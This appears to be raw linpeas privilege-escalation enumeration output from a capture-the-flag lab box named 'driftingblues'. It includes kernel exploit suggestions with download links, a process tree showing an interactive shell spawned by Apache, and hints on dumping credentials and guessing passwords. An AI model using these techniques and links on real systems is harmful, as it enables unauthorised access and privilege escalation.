   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-1959] userns_root_sploit

   Details: http://www.openwall.com/lists/oss-security/2013/04/29/1
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/25450

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297


╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found                                                                        
═╣ AppArmor profile? .............. unconfined                                                                                
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                      
═╣ PaX bins present? .............. PaX Not Found                                                                             
═╣ Execshield enabled? ............ Execshield Not Found                                                                      
═╣ SELinux enabled? ............... sestatus Not Found                                                                        
═╣ Seccomp enabled? ............... disabled                                                                                  
═╣ User namespace? ................ disabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes                                                                                       

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                           
                                   ╚═══════════╝                                                                              
╔══════════╣ Container related tools present (if any):
╔══════════╣ Container details                                                                                                
═╣ Is this a container? ........... No                                                                                        
═╣ Any running containers? ........ No                                                                                        
                                                                                                                              

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                           
                                     ╚═══════╝                                                                                
./linpeas.sh: 1634: ./linpeas.sh: curl: not found
Learn and practice cloud hacking techniques in training.hacktricks.wiki
                                                                                                                              
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP? ........................... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                            
                ╚════════════════════════════════════════════════╝                                                            
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                                  
root       385  0.0  0.1  21508  1532 ?        Ss   13:59   0:00 udevd --daemon[0m                                            
root       501  0.0  0.1  21500  1232 ?        S    13:59   0:00  _ udevd --daemon[0m
root       502  0.0  0.1  21504  1144 ?        S    13:59   0:00  _ udevd --daemon[0m
root      1924  0.0  0.2  53308  2060 ?        Sl   13:59   0:00 /usr/sbin/rsyslogd -c5
root      1969  0.0  0.4 102800  4820 ?        Sl   13:59   0:03 /usr/bin/vmtoolsd
root      1977  0.0  0.0   4124   660 ?        Ss   13:59   0:00 /usr/sbin/acpid
root      2028  0.0  1.5 234896 15896 ?        Ss   13:59   0:00 /usr/sbin/apache2 -k start
www-data  3621  0.0  1.4 237052 15060 ?        S    15:23   0:00  _ /usr/sbin/apache2 -k start
www-data  3744  0.0  0.8 235236  9124 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3802  0.0  0.0   4188   580 ?        S    16:10   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data  3806  0.0  0.0   4188   628 ?        S    16:10   0:00  |       _ /bin/sh -i
www-data  3920  0.2  0.1   4936  1416 ?        S    16:19   0:00  |           _ /bin/sh ./linpeas.sh
www-data  8113  0.0  0.0   4936  1008 ?        S    16:19   0:00  |               _ /bin/sh ./linpeas.sh
www-data  8117  0.0  0.1  15456  1168 ?        R    16:19   0:00  |               |   _ ps fauxwww
www-data  8116  0.0  0.0   4936   844 ?        S    16:19   0:00  |               _ /bin/sh ./linpeas.sh
www-data  3746  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3756  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3762  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3774  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3813  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3828  0.0  0.8 234976  8268 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3833  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3840  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
www-data  3857  0.0  0.7 234976  7340 ?        S    16:10   0:00  _ /usr/sbin/apache2 -k start
root      2077  0.0  0.1  20416  1072 ?        Ss   13:59   0:00 /usr/sbin/cron
root      2127  0.0  0.0   4188   712 ?        S    13:59   0:00 /bin/sh /usr/bin/mysqld_safe
mysql     2454  0.0  4.1 364012 42968 ?        Sl   13:59   0:01  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2455  0.0  0.0   4096   628 ?        S    13:59   0:00  _ logger -t mysqld -p daemon[0m.error
101       2822  0.0  0.0  46820   996 ?        Ss   13:59   0:00 /usr/sbin/exim4 -bd -q30m
root      2850  0.0  0.0  16264   956 tty1     Ss+  13:59   0:00 /sbin/getty 38400 tty1
root      2851  0.0  0.0  16264   952 tty2     Ss+  13:59   0:00 /sbin/getty 38400 tty2
root      2852  0.0  0.0  16264   948 tty3     Ss+  13:59   0:00 /sbin/getty 38400 tty3
root      2853  0.0  0.0  16264   948 tty4     Ss+  13:59   0:00 /sbin/getty 38400 tty4
root      2854  0.0  0.0  16264   956 tty5     Ss+  13:59   0:00 /sbin/getty 38400 tty5
root      2855  0.0  0.0  16264   956 tty6     Ss+  13:59   0:00 /sbin/getty 38400 tty6


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory             
gdm-password Not Found                                                                                                        
gnome-keyring-daemon Not Found                                                                                                
lightdm Not Found                                                                                                             
vsftpd Not Found                                                                                                              
apache2 process found (dump creds from memory as root)                                                                        
sshd Not Found
                                                                                                                              
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                     
                                                                                                                              
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                            
COMMAND    PID  TID        USER   FD      TYPE DEVICE SIZE/OFF  NODE NAME                                                     

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths               
                                                                                                                              
╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                          
/usr/bin/crontab                                                                                                              
incrontab Not Found
-rw-r--r-- 1 root root     722 Jul  3  2012 /etc/crontab                                                                      

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 72 root root 4096 Aug  9  2022 ..
-rw-r--r--  1 root root  102 Jul  3  2012 .placeholder
-rw-r--r--  1 root root  510 Jul 21  2016 php5

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root  4096 Mar 17  2021 .
drwxr-xr-x 72 root root  4096 Aug  9  2022 ..
-rw-r--r--  1 root root   102 Jul  3  2012 .placeholder
-rwxr-xr-x  1 root root   633 Aug 18  2015 apache2
-rwxr-xr-x  1 root root 14985 Oct 17  2014 apt
-rwxr-xr-x  1 root root   314 Nov  7  2012 aptitude
-rwxr-xr-x  1 root root   355 Jun 11  2012 bsdmainutils
-rwxr-xr-x  1 root root   256 Mar 26  2016 dpkg
-rwxr-xr-x  1 root root  4125 Mar 14  2016 exim4-base
-rwxr-xr-x  1 root root    89 May 17  2012 logrotate
-rwxr-xr-x  1 root root  1365 Jun 18  2012 man-db
-rwxr-xr-x  1 root root   249 May 25  2012 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 72 root root 4096 Aug  9  2022 ..
-rw-r--r--  1 root root  102 Jul  3  2012 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 72 root root 4096 Aug  9  2022 ..
-rw-r--r--  1 root root  102 Jul  3  2012 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 72 root root 4096 Aug  9  2022 ..
-rw-r--r--  1 root root  102 Jul  3  2012 .placeholder
-rwxr-xr-x  1 root root  907 Jun 18  2012 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                      
                                                                                                                              
╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                      
                                                                                                                              
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                    
You can't write on systemd PATH                                                                                               

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                     
                                                                                                                              
╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                     
sed: -e expression #1, char 0: no previous regular expression                                                                 
/dev/log
  └─(Read Write)
/run/acpid.socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/udev/control
  └─(Read )
/var/run/acpid.socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                       
busctl Not Found                                                                                                              
╔══════════╣ D-Bus config files                                                                                               
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                       
                                                                                                                              


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                           
                              ╚═════════════════════╝                                                                         
╔══════════╣ Interfaces
default         0.0.0.0                                                                                                       
loopback        127.0.0.0
link-local      169.254.0.0

eth0      Link encap:Ethernet  HWaddr 00:50:56:9e:9b:b1  
          inet addr:192.168.189.219  Bcast:192.168.189.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe9e:9bb1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1814354 errors:0 dropped:311 overruns:0 frame:0
          TX packets:1766386 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:305074796 (290.9 MiB)  TX bytes:921319405 (878.6 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:5128 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5128 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:507432 (495.5 KiB)  TX bytes:507432 (495.5 KiB)


╔══════════╣ Hostname, hosts and DNS
driftingblues                                                                                                                 
127.0.0.1       localhost
127.0.1.1       driftingblues

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 192.168.189.254

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                  
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                             
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 ::1:25                  :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                            
                                                                                                                              


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                           
                               ╚═══════════════════╝                                                                          
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                       
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                         

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                  
netpgpkeys Not Found
netpgp Not Found                                                                                                              
                                                                                                                              
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                               
                                                                                                                              

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                         
ptrace protection is enabled ()                                                                                               

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2   
                                                                                                                              
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                               

╔══════════╣ Users with console
backup:x:34:34:backup:/var/backups:/bin/sh                                                                                    
bin:x:2:2:bin:/bin:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
games:x:5:60:games:/usr/games:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                        
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(Debian-exim) gid=103(Debian-exim) groups=103(Debian-exim)
uid=102(mysql) gid=105(mysql) groups=105(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 16:19:22 up  2:19,  0 users,  load average: 0.08, 0.05, 0.05                                                                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     tty1         Wed Jul 20 14:18:03 2022 - crash                    (15+19:50)   0.0.0.0                                
reboot   system boot  Wed Jul 20 14:17:55 2022 - Mon Aug  8 13:32:51 2022 (18+23:14)   0.0.0.0
reboot   system boot  Wed Jul 20 14:00:02 2022 - Mon Aug  8 13:32:51 2022 (18+23:32)   0.0.0.0
root     tty1         Wed Jul 20 13:53:51 2022 - crash                     (00:06)     0.0.0.0
reboot   system boot  Wed Jul 20 13:53:44 2022 - Mon Aug  8 13:32:51 2022 (18+23:39)   0.0.0.0
reboot   system boot  Wed Jul 20 13:42:17 2022 - Mon Aug  8 13:32:51 2022 (18+23:50)   0.0.0.0
reboot   system boot  Wed Jul 20 13:41:49 2022 - Mon Aug  8 13:32:51 2022 (18+23:51)   0.0.0.0
reboot   system boot  Wed Jul 20 13:36:19 2022 - Mon Aug  8 13:32:51 2022 (18+23:56)   0.0.0.0

wtmp begins Wed Mar 17 10:36:27 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                             
root             tty1                      Tue Aug  9 10:35:16 -0500 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                     
                                                                                                                              
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                              


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                            
                             ╚══════════════════════╝                                                                         
╔══════════╣ Useful software
/usr/bin/base64                                                                                                               
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/bin/nc
/bin/nc.traditional
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                4:4.7.2-1                               amd64        GNU C++ compiler                  
ii  g++-4.7                            4.7.2-5                                 amd64        GNU C++ compiler
ii  gcc                                4:4.7.2-1                               amd64        GNU C compiler
ii  gcc-4.6                            4.6.3-14                                amd64        GNU C compiler
ii  gcc-4.7                            4.7.2-5                                 amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.2.22 (Debian)                                                                        
Server built:   Aug 18 2015 09:50:52
httpd Not Found
                                                                                                                              
Nginx version: nginx Not Found
                                                                                                                              
/etc/apache2/mods-enabled/php5.conf-<FilesMatch ".+\.ph(p[345]?|t|tml)$">
/etc/apache2/mods-enabled/php5.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php5.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php5.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php5.conf-<FilesMatch ".+\.ph(p[345]?|t|tml)$">
/etc/apache2/mods-available/php5.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php5.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php5.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/apache2/sites-enabled                                                           
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 26 Mar 17  2021 /etc/apache2/sites-enabled/000-default -> ../sites-available/default
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www
        <Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>



-rw-r--r-- 1 root root 68148 Jul 21  2016 /etc/php5/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root root 67825 Jul 21  2016 /etc/php5/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On



╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                              
-rw------- 1 root root 333 Mar 17  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  9  2022 /etc/pam.d                                                                           


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                          
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 17  2021 /usr/share/keyrings                                                                  




╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 696 Jun 17  2012 /usr/share/bash-completion/completions/postfix                                        


╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3392 Sep 25  2014 /etc/skel/.bashrc                                                                    





-rw-r--r-- 1 root root 675 Sep 25  2014 /etc/skel/.profile




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                              





















-rw-r--r-- 1 root root 3504 Jan 27  2016 /etc/mysql/my.cnf






























╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/my.cnf' Mysql user: user               = mysql                                                               
Found readable /etc/mysql/my.cnf
[client]
port            = 3306
socket          = /var/run/mysqld/mysqld.sock
[mysqld_safe]
socket          = /var/run/mysqld/mysqld.sock
nice            = 0
[mysqld]
user            = mysql
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
port            = 3306
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
lc-messages-dir = /usr/share/mysql
skip-external-locking
bind-address            = 127.0.0.1
key_buffer              = 16M
max_allowed_packet      = 16M
thread_stack            = 192K
thread_cache_size       = 8
myisam-recover         = BACKUP
query_cache_limit       = 1M
query_cache_size        = 16M
expire_logs_days        = 10
max_binlog_size         = 100M
[mysqldump]
quick
quote-names
max_allowed_packet      = 16M
[mysql]
[isamchk]
key_buffer              = 16M
!includedir /etc/mysql/conf.d/

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.5.47, for debian-linux-gnu (x86_64) using readline 6.2                                             


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                    
═╣ MySQL connection using root/NOPASS ................. No                                                                    
                                                                                                                              
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                  
gpg Not Found
netpgpkeys Not Found                                                                                                          
netpgp Not Found                                                                                                              
                                                                                                                              
-rw------- 1 root root 1200 Mar 17  2021 /etc/apt/trustdb.gpg
-rw------- 1 root root 3836 Mar 17  2021 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 5138 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5147 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2775 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 4084 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-squeeze-automatic.gpg
-rw-r--r-- 1 root root 2853 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-squeeze-stable.gpg
-rw-r--r-- 1 root root 3780 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg
-rw-r--r-- 1 root root 2851 Jan  1  2015 /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg
-rw-r--r-- 1 root root 26628 Jan  1  2015 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 10601 Jan  1  2015 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2373 Jun 17  2017 /var/lib/apt/lists/archive.debian.org_debian_dists_wheezy_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAABCAAGBQJZRO8MAAoJEItIrWJGklVTnboQAKSHzEe9nE3TNwZP5kus7/p1
WCxaSKCB4wv/cL+80A7mepINdyN30TrIKKqVpEy1NIeSUdEJ+KBqEw22ryAldgDH
Nlws/JBaOZG5Pa8KoaYiuSs5m3g9GgBO7vspByTjHgivEiurzuO/+Ky2Y4x8xlPO
+beTosKx6K9rcEJgYnEyeTRTHvASAP2bA/QyifhUKDS7Bcg03w1p9F1xloA+F/yK
MTC0FlmQyRiJ2Kra5LKeHTf2QoT7EGTNsRhdhPE9fVJQWjvhQzza1HJcskAjoFGk
9cdRz1JyxF4Z97YBy1Z1E7EVWK0j9O8ERclE7K657YM/siu2vpXnibE7EoOxYYnI
WSUzTyxrggu4zwLaT6W6qrxEMSUIrCwgdUz1a/IVpdbiivbmXL/wLj1L2ynMflzM
uRCDjv+qPJIX4nWEOmWx0BbtTe33NTlkFTzRuGArwFrrS6ZzgX10JOfVd/zFIGX+
N0PQX2ZE/nz80Va6Utvz3bS7gJ3VN+pN7vcwMd44pJbkEvB3phkGyrVW//xrttOB
b+LQucIT/JAB0TGPdKf7OyKDa2/WKhcpYz/1jaRFI/tQ/P6wnFUgFkO8iaE3dJLC
fTs0VdHIW0ZtlZ+O9TPGQBi8HxmlvJItnZekZHRT0qtTxUgoHHqBXTxIF+qg7vYr
ivNZnhw+0LOmGQ7NiI1ViQIcBAABCAAGBQJZRO8MAAoJEHY40EQrkNAQnboP/2o5
m0A70Uquelk1EcdankZ9lPokoAAJLFYbAcswUGm+eOwHN/ypsfyNocz0zRi8NeX0
5RaaPR/YrsBP+lUv/Iw4wGTojUsS8M7K6/Isddcwv7NMuSfGmVDH8qFPFe5HUZsC
vEexm/2SdlDywUb4Rpw7gFsyCZqh7Bb+5SZ3WTqAflzUdqSTjVkuWyhEAhcSKWqc
TpoQjP1j3Ticq7jB70J1V4mxR2wJbDAUpr2DgafCnZnbL8p0YuJuY8qBl9O94kP4
eLqqmCLUlUU5dz5tStd1fFlH0OK/7h+Y9WnQYDVxI+8UmhOfTMzc82KgyVklSjcF
icgXkrIJesBwpmIUC5dzgY+LkqVInUCt7D0+TC3BEStkFqRssYjZ3t1RmAq/rRHA
9fgwBO/KAYexSHicYXCwgsiPuZ5jVu0VYKRLS0lxQ3bCKut+5IgI6LuhYbEikJ+j
ZgmmjSmygYNfwkOHwGJlW12ppGY+hAmO2VleBYJHhdyodcLdy9gHJneGSmwIycBb
iKTLZ1K6YNEsXw1TEj4ZkjQx6Pxv/I7++KzB8hLfWzMcCEan4S8PQRphpnV1cbRD
Nf/WyyMdKu6KrL2TlFxYcieH2LBNHQwHmtm9OV8V/0Gy/s+9cw9WqIM6pwxTuR0+
3hMe5zYKvX5lqQZVke+kYFKg4YuFEg2Mc2IJ3XH5
=PK8a
-----END PGP SIGNATURE-----
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAABCAAGBQJZRPMgAAoJEG+yocJl/7dkRuwP/2BBNrpQOeaBvv/DhVW17psX
yHws8OUfbQoY0u/CLCF7g64bTzddTVEzvzHMO7yiLE+ynWgNfdJIWixcU1KgZA73
tjxUxFFDfs+0Q6bmK9h+fL6sf5gHV4bCZ16lKzrFpYtnhXlmJnyr9kYQCPouQSD9
H08eL4bCHbYKPXPnZ5d9L2dOR2netXdESw7aGdhs6EaD+f9T3vsc1h6iYiJN2qsv
mPFamXmUANfn4QMjGtsuEYmKpaNdJzOjtXWlwmLD79LVp6w4xf1htEwExjiMyGj3
C2bqYdyJFCLH8v9AW+9CskJqOqob8u2LXP3+iEQ2Fju4x4/2uwxLZVNVXVNdxrnc
eD7RExFVhLpdpilJL71EjOoZQ25fwd9YKB3vlS5VcPSAkziIIYXZZP8xDL9pbiPN
iNJpyXtBtVAo25Lgn2KOGsLqtSnT/d9iG2JrXxmjIL4rWu72Ey41P0LDjknNqZBc
1vRYnnuQaofvuBORM8/6N9cxmg1Bt9bPggiNqZrqOvqvqyfyIVU1/RBkVxZ6UUpc
qUGyC/zyGkm86IiXNkPmy8+YBLCixVc1lEq5mFHXxfYXM/eWD4B4yaE63T6ICXin
5u80WQwKroR1u1+ZWeFyrrqSIQdop/BNzB6uPCyVkQV5sONtQAty8vLsFT1umqDw
9RLdsczczUj0xtFuPRJ+
=PcDo
-----END PGP SIGNATURE-----
-rw-r--r-- 1 root root 801 Oct 15  2016 /var/lib/apt/lists/packages.dotdeb.org_dists_wheezy-php55_Release.gpg
-----BEGIN PGP SIGNATURE-----
iQIcBAABCAAGBQJYAn+VAAoJEOnHT+6iCYpunuAP/0Sd64QghqmflY8w+No/itQb
JfWE1DysKrhLOKNG90SODD/0E7KjaxphxBHvirMFBWwQNpfByi67HQ+KSavRLIQJ
